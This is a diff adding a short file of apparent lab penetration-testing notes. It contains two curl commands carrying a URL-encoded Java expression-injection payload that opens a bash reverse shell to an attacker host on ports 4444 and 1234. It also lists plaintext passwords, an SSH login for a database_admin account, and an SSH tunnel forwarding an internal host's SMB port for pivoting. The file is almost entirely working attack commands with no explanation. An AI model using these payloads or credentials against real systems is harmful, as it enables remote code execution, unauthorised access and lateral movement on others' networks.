@@ -1,0 +1,17 @@
+
+P@ssw0rd!
+
+
+curl http://192.168.187.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.184/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+curl http://192.168.187.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.184/1234%200%3E%261%27%29.start%28%29%22%29%7D/
+
+
+ssh database_admin@10.4.187.215
+P@ssw0rd!
+
+
+172.16.187.217
+
+sqlpass123
+ssh -N -L 0.0.0.0:4455:172.16.187.217:445 database_admin@10.4.187.215
